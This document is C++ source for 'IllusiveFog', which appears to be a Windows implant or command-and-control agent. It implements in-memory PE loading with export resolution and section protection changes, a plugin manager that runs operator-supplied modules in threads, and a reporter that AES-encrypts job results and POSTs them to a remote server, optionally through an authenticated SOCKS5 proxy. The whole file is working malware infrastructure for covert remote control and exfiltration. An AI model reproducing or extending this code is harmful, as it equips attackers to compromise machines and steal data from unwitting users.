PVOID IllusiveFog::Plugin::plugin_ldr_get_exports(PIMAGE_EXPORT_DIRECTORY export_dir, DWORD export_number) {
	UINT_PTR uimg_exports = (UINT_PTR)((PBYTE)this->memory + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);
	export_dir = (PIMAGE_EXPORT_DIRECTORY)uimg_exports;
	PDWORD pdwaddrfunc = (PDWORD)(PBYTE)((PBYTE)this->memory + export_dir->AddressOfFunctions);
	PDWORD addrOfName = (PDWORD)((PBYTE)this->memory + export_dir->AddressOfNames);
	PDWORD addrOfNamedinals = (PDWORD)((PBYTE)this->memory + export_dir->AddressOfNameOrdinals);
	for (WORD cx = 0; cx < export_number; cx++) {
		PCHAR funcname = (PCHAR)((PBYTE)this->memory + addrOfName[cx]);
		PVOID funcaddr = (PBYTE)this->memory + pdwaddrfunc[cx];
		return funcaddr;

	}

}

IllusiveFog::Plugin::plugin_result IllusiveFog::Plugin::plugin_ldr_set_protection() {
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);
	DWORD protection = 0;
	for (int i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
		if (section[i].Characteristics & IMAGE_SCN_CNT_CODE)
			section[i].Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
		switch ((DWORD)section[i].Characteristics >> (32 - 3))
		{
		case 1: protection = PAGE_EXECUTE; break;

		case 0:
		case 2: protection = PAGE_READONLY; break;

		case 3: protection = PAGE_EXECUTE_READ; break;

		case 4:
		case 6: protection = PAGE_READWRITE; break;

		case 5:
		default: protection = PAGE_READWRITE; break;
		}
		VirtualProtect((LPVOID)((PBYTE)this->memory + section[i].VirtualAddress),
			section[i].Misc.VirtualSize,
			protection,
			&protection);
	}
	return plugin_s_ok;
}
LPVOID IllusiveFog::MemoryManager::allocate_plugin(DWORD size) {
	this->plugin_count++;
	return VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}
IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::free_plugin(LPVOID plugin, DWORD size) {
	this->plugin_count--;
	VirtualFree(plugin, size, MEM_FREE);
	return memory_s_ok;
}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::initialize_plugin_manager() {
	this->bset = true;

	return plugin_manager_s_ok;
}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::set_plugin(enum plugins plugin, PVOID export_plugin) {
	this->hevents[plugin] = CreateEvent(NULL, NULL, NULL, NULL);
	this->plugin_events[plugin] = CreateEvent(NULL, NULL, NULL, NULL);

	memcpy(&this->plugin_export_function_addr[plugin], &export_plugin, sizeof(PVOID));
	return plugin_manager_s_ok;
}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::unset_plugin(enum plugins plugin) {
	ZeroMemory(&this->plugin_export_function_addr[plugin], sizeof(PVOID));
	this->plugin_export_function_addr[plugin] = NULL;
	return plugin_manager_s_ok;
}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::initialize_plugin(enum plugins plugin) {
	this->PluginExports[plugin] = (PluginExport*)(FARPROC)(LPVOID)this->plugin_export_function_addr[plugin];
	return plugin_manager_s_ok;
}

static void new_IllusiveFog_job_reporter(Preporter_param reporter_param);
void  IllusiveFog::IllusiveFog::IllusiveFog_report_ec_test(DWORD rep) {
	this->IllusiveFog_agent_report_ec(rep);


} //just for test
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_agent_report_ec(DWORD agent_ec) {
	char* temp = (char*)MemoryManager::AllocateTemporary(100);
	ZeroMemory(temp, 100);
	_itoa(agent_ec, temp, 10);
	reporter::form_error_code_parameter(temp, this->IllusiveFog_report->IllusiveFog_param);
	reporter::report_error_code(this->IllusiveFog_report->IllusiveFog_ec_path, this->IllusiveFog_report->dest);
	return IllusiveFog_s_ok;

}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_invoke_plugin(PJobs jobs) {
	__try {
		HANDLE reporter_event = CreateEvent(NULL, NULL, NULL, NULL);
		Preporter_param reporter_param = NULL;
		DWORD thread = 0;
		HANDLE report_handle = NULL;
		reporter_param = MemoryManager::allocate_reporter_param();
		//reporter_param->jobs = jobs;
		strcpy(reporter_param->jobid, jobs->jobid);
		reporter_param->reporter_dest = IllusiveFog_agent_session->AgentPostRequest;
		reporter_param->reporter_event = reporter_event;
		reporter_param->socks_ip = socketlib::_sockaddr;
		reporter_param->dest_ip = socketlib::_destaddr;
		reporter_param->destport = socketlib::_destport;
		reporter_param->sockport = socketlib::_sockport;
		reporter_param->sockstimer = socketlib::socks_timer;
		reporter_param->key = IllusiveFog_agent_session->CommunicationKey;
		reporter_param->param1 = this->report_communication_parameter->param1;
		reporter_param->param2 = this->report_communication_parameter->param2;
		reporter_param->param3 = this->report_communication_parameter->param3;
		reporter_param->error_code_path = IllusiveFog_agent_session->AgentErrorCodePath;
		reporter_param->agent_error_code_param = this->report_communication_parameter->param4;
		if (socketlib::auth_enabled) {
			reporter_param->auth_user = socketlib::_set_user_auth;
			reporter_param->auth_pass = socketlib::_set_pass_auth;
			reporter_param->auth_enabled = TRUE;
		}
		else {
			reporter_param->auth_enabled = FALSE;
		}
		__try {
			ZeroMemory(jobs->plugin_param + strlen(jobs->plugin_param) - 1, 1);

		}
		__except (EXCEPTION_EXECUTE_HANDLER) {

			MemoryManager::FreeParameter(jobs->parameter_ptr);

			ZeroMemory(jobs->jobid, 20);
			MemoryManager::FreeJobs(jobs);
			MemoryManager::free_reporter_param(reporter_param);
			CloseHandle(reporter_event); //do something about this...
			return IllusiveFog_s_ok;
		}
		report_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)new_IllusiveFog_job_reporter, reporter_param, NULL, &thread);
		SetThreadPriority(report_handle, THREAD_PRIORITY_TIME_CRITICAL);
		Pplugin_param plugin_params = MemoryManager::allocate_plugin_param_struct();

		plugin_params->reporter_event = reporter_event;
		plugin_params->reporter_threadid = thread;
		plugin_params->param = jobs->plugin_param + 1;
		if (jobs->plugin_pellets == true) {
			plugin_params->pellet_struct = (Ppellet_param)malloc(sizeof(pellet_param));
			ZeroMemory(plugin_params->pellet_struct, sizeof(pellet_param));
			plugin_params->pellet_struct->agent_id = IllusiveFog_agent_session->AgentID;
			plugin_params->pellet_struct->pellet_key = IllusiveFog_agent_session->pellet_key;
			plugin_params->pellet_struct->comm_key = IllusiveFog_agent_session->CommunicationKey;
			plugin_params->pellet_struct->destport = socketlib::_destport;
			plugin_params->pellet_struct->dest_ip = socketlib::_destaddr;
			plugin_params->pellet_struct->socks_ip = socketlib::_sockaddr;
			plugin_params->pellet_struct->sockport = socketlib::_sockport;
			if (socketlib::auth_enabled) {
				plugin_params->pellet_struct->enable_auth = TRUE;
				plugin_params->pellet_struct->auth_user_id = socketlib::_set_user_auth;
				plugin_params->pellet_struct->auth_user_pass = socketlib::_set_pass_auth;

			}
		}
		this->plugin_debug_manager = PluginManager::initialize_plugin(jobs->plugin);
		if (this->plugin_debug_manager == plugin_manager_plugin_unset) {
#ifdef _DEBUG
			this->IllusiveFog_plugin_manager_debug(plugin_debug_manager);

#endif

		}


		this->plugin_debug_manager = PluginManager::plugin_handler(jobs->plugin);
		if (this->plugin_debug_manager == plugin_manager_invalid_plugin_thread_launched) {
#ifdef _DEBUG
			this->IllusiveFog_plugin_manager_debug(plugin_debug_manager);
#endif
		}
		plugin_params->threadid = PluginManager::dwthreadid[jobs->plugin];
		plugin_params->plugin_events = PluginManager::plugin_events[jobs->plugin];
		PluginManager::plugin_manager_timer(jobs->plugin);
		this->plugin_debug_manager = PluginManager::plugin_manager_invoke_plugin(jobs->plugin, (LPVOID)plugin_params, report_handle);

		if (this->plugin_debug_manager == plugin_manager_plugin_param_send_thread_failed) {
#ifdef _DEBUG
			this->IllusiveFog_plugin_manager_debug(plugin_debug_manager);
#endif
		}
		MemoryManager::FreeParameter(jobs->parameter_ptr);
		ZeroMemory(jobs->jobid, 20);
		if (jobs->plugin_pellets) {
			free(plugin_params->pellet_struct);
		}
		MemoryManager::FreeJobs(jobs);
		jobs = NULL;
		MemoryManager::free_reporter_param(reporter_param);
		CloseHandle(reporter_event); //do something about this...
		MemoryManager::plugin_param_struct_free(plugin_params);
		return IllusiveFog_s_ok;

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		IllusiveFog::IllusiveFog_agent_report_ec(IllusiveFog_error_IllusiveFog_invoke_plugin_failed);
		return IllusiveFog_error_IllusiveFog_invoke_plugin_failed;

	}


}
Pplugin_param IllusiveFog::MemoryManager::allocate_plugin_param_struct() {
	this->plugin_param_struct_count++;
	return (Pplugin_param)malloc(sizeof(plugin_param));
}

IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::plugin_param_struct_free(LPVOID plugin_param_struct) {
	__try {
		free(plugin_param_struct);
		this->plugin_param_struct_count--;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}
Preporter_param IllusiveFog::MemoryManager::allocate_reporter_param() {
	this->reporter_struct_count++;
	return (Preporter_param)malloc(sizeof(_reporter_param));
}

IllusiveFog::MemoryManager::memory_manager_result IllusiveFog::MemoryManager::free_reporter_param(LPVOID reporter_param) {
	__try {
		free(reporter_param);
		this->reporter_struct_count--;

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return invalid_heap_freed;
	}
}

LPTHREAD_START_ROUTINE plugin_manager_thread_new(HANDLE param_event) {
	MSG msg;
	for (;;) {
		while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
			continue;
		}
		GetMessage(&msg, NULL, NULL, NULL);
		Pplugin_param param = (Pplugin_param)msg.wParam;
		WaitForSingleObject(param->plugin_events, INFINITE);
		PostThreadMessage(param->threadid, WM_IllusiveFog_PLUGIN_LAUNCH, NULL, (LPARAM)(LPVOID)msg.wParam);
		ResetEvent(param->plugin_events);

		SetEvent(param_event);

	}
	return 0;

}

IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::plugin_handler(enum plugins plugin) {
	__try {


		if (this->dwthreadid[plugin] == NULL) {
			this->plugin_thread[plugin] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)this->PluginExports[plugin], this->plugin_events[plugin], NULL, &this->dwthreadid[plugin]);
			SetThreadPriority(this->plugin_thread[plugin], THREAD_PRIORITY_TIME_CRITICAL);
		}

		/*	if (this->worker_thread_id[plugin] == 0) {
				this->worker_handle[plugin] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)plugin_manager_thread_new, this->hevents[plugin], NULL, &this->worker_thread_id[plugin]);
			}*/

		return plugin_manager_s_ok;
	}


	__except (EXCEPTION_EXECUTE_HANDLER) {
		return plugin_manager_invalid_plugin_thread_launched;
	}
}

void new_IllusiveFog_job_reporter(Preporter_param reporter_param) {
	MSG msg;
	IllusiveFog::reporter* report = new IllusiveFog::reporter;
	report->reporter_initalize(reporter_param); //check error codes 
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		GetMessage(&msg, NULL, NULL, NULL);
		switch (msg.message) {
		case WM_IllusiveFog_REPORT: {
			//		MessageBoxA(NULL, (char*)msg.wParam, NULL, MB_OK);
			if (msg.wParam != NULL)
				report->form_reporter_message((char*)msg.wParam, NULL, (unsigned char*)reporter_param->key);
			else
				report->form_reporter_message((char*)" ", NULL, (unsigned char*)reporter_param->key);
			report->form_reporter_parameters(reporter_param->param1, reporter_param->param2, (char*)reporter_param->jobid, reporter_param->param3, WM_IllusiveFog_REPORT);
			report->report(reporter_param->reporter_dest, reporter_param->dest_ip);
			SetEvent(reporter_param->reporter_event);
			ResetEvent(reporter_param->reporter_event);
			delete report;
			ExitThread(0);
			break;
		}
		case WM_IllusiveFog_CALLBACK: { // might want to make  a loop for callbacks?
	//		MessageBoxA(NULL, (char*)msg.wParam, NULL, MB_OK);
			if (msg.wParam != NULL)
				report->form_reporter_message((char*)msg.wParam, NULL, (unsigned char*)reporter_param->key);
			else
				report->form_reporter_message((char*)" ", NULL, (unsigned char*)reporter_param->key);
			report->form_reporter_parameters(reporter_param->param1, reporter_param->param2, (char*)reporter_param->jobid, reporter_param->param3, WM_IllusiveFog_CALLBACK);
			report->report(reporter_param->reporter_dest, reporter_param->dest_ip);
			SetEvent(reporter_param->reporter_event);

			ResetEvent(reporter_param->reporter_event);
			continue;
			break;
		}
		case WM_IllusiveFog_REPORT_ERROR_CODE: {
			report->form_error_code_parameter((char*)msg.wParam, reporter_param->agent_error_code_param);
			report->report_error_code(reporter_param->error_code_path, reporter_param->dest_ip);
			SetEvent(reporter_param->reporter_event);
			ResetEvent(reporter_param->reporter_event);
			continue;
			break;
		}
		}
		SetEvent(reporter_param->reporter_event);
		ResetEvent(reporter_param->reporter_event);
		ZeroMemory(&msg, sizeof(msg));
		continue;
	}
}


IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::plugin_manager_invoke_plugin(enum plugins plugin, LPVOID plugin_parameter, HANDLE reporter_thread) {
	__try {


		WaitForSingleObject(this->plugin_events[plugin], INFINITE);
		PostThreadMessageA(this->dwthreadid[plugin], WM_IllusiveFog_PLUGIN_LAUNCH, NULL, (LPARAM)plugin_parameter);
		ResetEvent(this->plugin_events[plugin]);
		//	WaitForSingleObject(this->plugin_events[plugin], INFINITE);
		WaitForSingleObject(reporter_thread, INFINITE);
		/*WaitForSingleObject(this->hevents[plugin], INFINITE);
		PostThreadMessage(this->worker_thread_id[plugin], NULL, (WPARAM)plugin_parameter, plugin);
		ResetEvent(this->hevents[plugin]);
		WaitForSingleObject(this->hevents[plugin], INFINITE);
		WaitForSingleObject(reporter_thread, INFINITE);
		ResetEvent(this->plugin_events[plugin]);
		ResetEvent(this->hevents[plugin]);
*/
//once parameters are passed no need to wait for reporter thread?
		return plugin_manager_s_ok;
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return plugin_manager_plugin_param_send_thread_failed;
	}

	return plugin_manager_s_ok;
}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::plugin_clear(enum plugins plugin) {
	this->plugin_thread[plugin] = 0;
	this->worker_handle[plugin] = 0;
	/*this->hevents[plugin] = 0;
	*/this->plugin_events[plugin] = 0;
	this->dwthreadid[plugin] = 0;
	this->worker_thread_id[plugin] = 0;
	this->plugin_timer[plugin] = 0;
	return plugin_manager_s_ok;
}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::plugin_terminate(enum plugins plugin) {
	if (this->plugin_thread[plugin] /*&& this->worker_handle[plugin] */ != NULL) {

		WaitForSingleObject(this->plugin_events[plugin], INFINITE);
		PostThreadMessageA(this->dwthreadid[plugin], WM_IllusiveFog_PLUGIN_TERMINATE, NULL, NULL);
		WaitForSingleObject(this->plugin_thread[plugin], INFINITE);
		TerminateThread(this->worker_handle[plugin], 0);
		/*	CloseHandle(hevents[plugin]);
		*/	CloseHandle(plugin_events[plugin]);

	}
	else {
		return plugin_manager_plugin_threads_terminted;
	}
	return plugin_manager_s_ok;
}


IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_agent_report(char* message_report, char* ot) {
	return IllusiveFog_s_ok;
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_check_plugin_status() {
	this->dwtemp = 0;
	for (int i = 0; i <= PLUGIN_COUNT; i++) {

		if (PluginManager::plugin_timer[i] == NULL)
			continue;
		this->dwtemp = WaitForSingleObject(PluginManager::plugin_timer[i], NULL);
		switch (this->dwtemp) {
		case WAIT_OBJECT_0: {
			this->IllusiveFog_unload_plugin((plugins)i);
			break;
		}
		case WAIT_TIMEOUT:
			break;
		default:
			break;
		}


	}
	return IllusiveFog_s_ok;
}

IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_unload_plugin(enum plugins plugin) {
	this->plugin_debug_manager = PluginManager::plugin_terminate(plugin);
	if (this->plugin_debug_manager == plugin_manager_plugin_threads_terminted)
		return IllusiveFog_error_plugin_unloaded;
	PluginManager::plugin_clear(plugin);
	this->IllusiveFog_unset_plugin(plugin);
	Plugin::plugin_unload(plugin);

	return IllusiveFog_s_ok;

}
IllusiveFog::PluginManager::plugin_manager_result IllusiveFog::PluginManager::plugin_manager_timer(enum plugins plugin) {
	if (this->plugin_timer[plugin] == NULL) {
		lg_timer.QuadPart = -6000000000LL; //change it to 10mins
		//lg_timer.QuadPart = -100000000LL;
		this->plugin_timer[plugin] = CreateWaitableTimer(NULL, TRUE, NULL);
		SetWaitableTimer(this->plugin_timer[plugin], &lg_timer, 0, NULL, NULL, 0);

	}
	return plugin_manager_s_ok;
}

IllusiveFog::reporter::reporter_result IllusiveFog::reporter::reporter_initalize(Preporter_param reporter) {
	//check error add try except blocks
#ifdef SOCKS5
	socketlib::set_sockaddr(reporter->socks_ip, reporter->sockport);
#endif
	socketlib::set_destaddr(reporter->dest_ip, reporter->destport);
	socketlib::socks_timer = reporter->sockstimer;
	socketlib::set_socks_timer();

#ifdef SOCKS5

	if (reporter->auth_enabled) {
		socketlib::set_socksauth(reporter->auth_user, reporter->auth_pass);
	}
#endif

	//	socketlib::socket_connect(); //remove this!
	return reporter_success;
}
IllusiveFog::reporter::reporter_result IllusiveFog::reporter::form_reporter_message(char* report, char* error_code, unsigned char* key) {
	this->form_iv();
	this->crypt_result((unsigned char*)report, key, strlen(report));
	this->hex_iv_message(this->iv, this->crypted_result, this->dwtemp);
	ZeroMemory(this->iv, 16);
	free(this->crypted_result);
	this->form_final_message(this->hex_iv, this->hex_result);
	free(this->hex_iv);
	free(this->hex_result);
	return reporter_success;
}

IllusiveFog::reporter::reporter_result IllusiveFog::reporter::hex_iv_message(unsigned char* iv, unsigned char* message, DWORD report_size) {

	this->dwtemp = utils::utils_convert_to_hex((char*)message, NULL, 0, report_size);
	this->hex_result = (unsigned char*)malloc(this->dwtemp + 1);
	ZeroMemory(this->hex_result, this->dwtemp + 1);
	utils::utils_convert_to_hex((char*)message, (char*)this->hex_result, this->dwtemp, report_size);
	this->dwtemp = 0;
	this->dwtemp = utils::utils_convert_to_hex((char*)iv, NULL, 0, 16);
	this->hex_iv = (unsigned char*)malloc(this->dwtemp + 1);
	ZeroMemory(this->hex_iv, this->dwtemp + 1);
	utils::utils_convert_to_hex((char*)iv, (char*)this->hex_iv, this->dwtemp, 16);
	return reporter_success;
}
IllusiveFog::reporter::reporter_result IllusiveFog::reporter::form_reporter_parameters(char* result, char* jobparam, char* jobid, char* ec, DWORD error_code) {

	this->total += strlen(result) + strlen(jobid) + strlen(jobparam) + strlen((char*)this->result_max) + 100 + strlen(ec);

	this->final_report = (char*)malloc(total);
	ZeroMemory(this->final_report, total);
	strcpy(this->final_report, result);
	strcat(this->final_report, (char*)this->result_max);
	strcat(this->final_report, "&");
	strcat(this->final_report, jobparam);
	strcat(this->final_report, jobid);
	strcat(this->final_report, "&");
	strcat(this->final_report, ec);
	this->chtemp = (char*)malloc(100);
	_itoa(error_code, this->chtemp, 10);
	strcat(this->final_report, this->chtemp);
	free(this->chtemp);
	free(this->result_max);
	this->result_max = NULL;
	return reporter_success;

}


IllusiveFog::reporter::reporter_result IllusiveFog::reporter::crypt_result(unsigned char* result, unsigned char* key, DWORD size) {
	this->dwtemp = size;
	this->dwtemp = utils::utils_aes_encrypt_ms(key, this->iv, result, 0, this->dwtemp, TRUE);
	this->crypted_result = (unsigned char*)malloc(dwtemp + 1);
	ZeroMemory(this->crypted_result, this->dwtemp + 1);
	strncpy((char*)this->crypted_result, (char*)result, size);//might need to change this
	utils::utils_aes_encrypt_ms(key, this->iv, this->crypted_result, size, this->dwtemp, FALSE);
	return reporter_success;
}
IllusiveFog::reporter::reporter_result IllusiveFog::reporter::form_iv() {
	ZeroMemory(this->iv, 16);
	bool btr = CryptAcquireContext(&this->hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
	CryptGenRandom(this->hCryptProv, 16, (BYTE*)this->iv);
	btr = CryptReleaseContext(this->hCryptProv, NULL);
	return reporter_success;
}

IllusiveFog::reporter::reporter_result IllusiveFog::reporter::form_final_message(unsigned char* hex_iv, unsigned char* hex_message) {
	this->result_max = (unsigned char*)malloc(strlen((char*)hex_iv) + strlen((char*)hex_message) + strlen(this->delimiter) + 100);
	ZeroMemory(this->result_max, strlen((char*)hex_iv) + strlen((char*)hex_message) + strlen(this->delimiter) + 100);
	strcpy((char*)this->result_max, (char*)hex_iv);
	strcat((char*)this->result_max, this->delimiter);
	strcat((char*)this->result_max, (char*)hex_message);
	/*this->total = this->utils_convert_to_base64((char*)this->result_max, NULL, this->total);
	this->final_result = (char*)malloc(this->total+1);
	ZeroMemory(this->final_result, this->total + 1);
	this->utils_convert_to_base64((char*)this->result_max, this->final_result, this->total);
	free(this->result_max);
	this->chtemp = (char *)malloc(1);
	this->total = this->utils_url_encode(this->final_result, this->chtemp, 1);
	this->result_max = (unsigned char *)malloc(this->total+1);
	ZeroMemory(this->result_max, this->total + 1);
	this->total = this->utils_url_encode(this->final_result, (char *)this->result_max, this->total);
*/

	return reporter_success;
}
IllusiveFog::reporter::reporter_result IllusiveFog::reporter::report(char* report_dest, char* host) {
	char* request_temp = (char*)malloc(strlen(this->final_report) + post_request_extra_space + get_content_length_request_size + 20);
	ZeroMemory(request_temp, strlen(this->final_report) + post_request_extra_space + get_content_length_request_size + 20);
	char* ot_buffer = (char*)malloc(321);
	char* char_Temp = NULL;

	this->chtemp = (char*)malloc(100);
	_itoa(strlen(this->final_report), this->chtemp, 10);

	socketlib::send_post_request(report_dest, this->chtemp, this->final_report, host, request_temp, ot_buffer, 320);
	free(request_temp);
	free(this->final_report);
	free(this->chtemp);
	return reporter_success;
}
IllusiveFog::reporter::reporter_result IllusiveFog::reporter::form_error_code_parameter(char* error_code, char* error_code_param) {
	this->dwtemp = strlen(error_code_param) + 100 + strlen(error_code);
	this->ec_result = (char*)malloc(this->dwtemp);
	ZeroMemory(this->ec_result, this->dwtemp);
	strcpy(this->ec_result, error_code_param);
	strcat(this->ec_result, error_code);

	return reporter_success;

}
IllusiveFog::reporter::reporter_result IllusiveFog::reporter::report_error_code(char* error_code_path, char* host) {
	char* request_temp = (char*)malloc(strlen(this->ec_result) + post_request_extra_space + get_content_length_request_size + 20);
	ZeroMemory(request_temp, strlen(this->ec_result) + post_request_extra_space + get_content_length_request_size + 20);
	this->ec = (char*)malloc(100);
	ZeroMemory(this->ec, 100);
	_itoa(strlen(this->ec_result), this->ec, 10);
	char* ot_buffer = (char*)malloc(321);
	socketlib::send_post_request(error_code_path, this->ec, this->ec_result, host, request_temp, ot_buffer, 320);
	free(ot_buffer);
	free(request_temp);
	free(this->ec);
	free(this->ec_result);
	return reporter_success;
}
IllusiveFog::IllusiveFog::IllusiveFog_result IllusiveFog::IllusiveFog::IllusiveFog_agent_reporter(char* message, char* key, char* jobid) {
	IllusiveFog::reporter::form_reporter_message(message, NULL, (unsigned char*)key);
	IllusiveFog::reporter::form_reporter_parameters(this->report_communication_parameter->param1, this->report_communication_parameter->param2, jobid, this->report_communication_parameter->param3, WM_IllusiveFog_REPORT);
	char* request_temp = (char*)malloc(strlen(IllusiveFog::reporter::final_report) + post_request_extra_space + get_content_length_request_size + 20);
	ZeroMemory(request_temp, strlen(IllusiveFog::reporter::final_report) + post_request_extra_space + get_content_length_request_size + 20);
	char* ot_buffer = (char*)malloc(321);
	char* chtemp = (char*)malloc(100);
	_itoa(strlen(this->final_report), chtemp, 10);
	socketlib::send_post_request(IllusiveFog_agent_session->AgentPostRequest, chtemp, this->final_report, socketlib::_destaddr, request_temp, ot_buffer, 320);

	free(request_temp);
	free(this->final_report);
	free(chtemp);
	free(ot_buffer);
	chtemp = NULL;
	request_temp = NULL;
	ot_buffer = NULL;
	delete chtemp;
	delete request_temp;
	delete ot_buffer;
	return IllusiveFog_s_ok;
}





















































